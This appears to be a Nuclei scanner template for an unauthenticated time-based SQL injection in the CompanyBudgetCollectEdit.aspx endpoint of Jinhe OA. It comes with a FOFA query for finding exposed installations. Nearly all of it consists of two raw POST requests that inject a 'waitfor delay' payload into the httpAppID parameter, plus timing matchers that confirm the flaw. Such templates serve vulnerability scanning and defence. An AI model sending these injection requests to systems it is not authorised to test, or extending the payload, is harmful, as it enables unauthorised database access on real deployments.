id: jinhe-oa-companybudgetcollectedit-sqli
info:
  name: 金和OA CompanyBudgetCollectEdit 接口 SQL注入漏洞
  author: 0dayPoc
  severity: high
  description: |-
    金和OA系统中的CompanyBudgetCollectEdit接口存在SQL注入漏洞，攻击者可通过构造恶意SQL语句执行未经授权的数据库操作。
    该漏洞允许远程攻击者在未认证的情况下获取敏感数据或操控数据库内容。

    fofa: app="金和网络-金和OA"
  tags: 金和OA
http:
- raw:
  - |
    POST /c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollectEdit.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    httpAppID=1'waitfor+delay+'0:0:5'--+&httpOID=1
  - |
    POST /c6/JHSoft.Web.CostControl/Collect/CompanyBudgetCollectEdit.aspx/ HTTP/1.1
    Host: {{Hostname}}
    Content-Type: application/x-www-form-urlencoded

    httpAppID=1'waitfor+delay+'0:0:8'--+&httpOID=1
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
